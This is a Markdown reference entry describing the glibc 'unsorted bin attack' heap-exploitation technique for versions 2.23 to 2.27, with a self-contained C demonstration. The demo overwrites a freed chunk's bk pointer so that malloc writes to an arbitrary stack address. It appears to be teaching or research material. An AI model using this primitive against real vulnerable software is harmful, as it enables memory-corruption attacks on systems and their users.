# `unsorted_bin_attack`

## Summary

- Family: `Bin Metadata Abuse And Allocator Writes`
- README summary: Exploiting the overwrite of a freed chunk on unsorted bin freelist to write a large value into arbitrary address
- Core effect: write a large allocator value to an arbitrary address.
- README applicability: `< 2.29`
- Solver window note: `2.23 -> 2.27`

## When To Consider It

- historical unsorted-bin metadata overwrite.

## Version Groups

- `2.23 -> 2.27`.

## Version Differences

- This is a historical unsorted-bin write family and only exists in the retained corpus through 2.27.
- The main difference across retained versions is allocator-era context, especially the absence or early presence of tcache.
- Do not project this technique onto later libc versions without separately proving the bin behavior.

## Representative Source Code

- Representative version: `glibc 2.27`

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(){
	fprintf(stderr, "This technique only works with buffers not going into tcache, either because the tcache-option for "
		    "glibc was disabled, or because the buffers are bigger than 0x408 bytes. See build_glibc.sh for build "
		    "instructions.\n");
	fprintf(stderr, "This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n");
	fprintf(stderr, "In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "
		   "global variable global_max_fast in libc for further fastbin attack\n\n");

	volatile unsigned long stack_var=0;
	fprintf(stderr, "Let's first look at the target we want to rewrite on stack:\n");
	fprintf(stderr, "%p: %ld\n\n", &stack_var, stack_var);

	unsigned long *p=malloc(0x410);
	fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %p\n",p);
	fprintf(stderr, "And allocate another normal chunk in order to avoid consolidating the top chunk with"
           "the first one during the free()\n\n");
	malloc(500);

	free(p);
	fprintf(stderr, "We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
		   "point to %p\n",(void*)p[1]);

	//------------VULNERABILITY-----------

	p[1]=(unsigned long)(&stack_var-2);
	fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
	fprintf(stderr, "And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n",(void*)p[1]);

	//------------------------------------

	malloc(0x410);
	fprintf(stderr, "Let's malloc again to get the chunk we just free. During this time, the target should have already been "
		   "rewritten:\n");
	fprintf(stderr, "%p: %p\n", &stack_var, (void*)stack_var);

	assert(stack_var != 0);
}
```

## Related Techniques

- `fastbin_reverse_into_tcache`
- `house_of_lore`
- `house_of_mind_fastbin`
- `large_bin_attack`
- `tcache_stashing_unlink_attack`
- `unsafe_unlink`
- `unsorted_bin_into_stack`
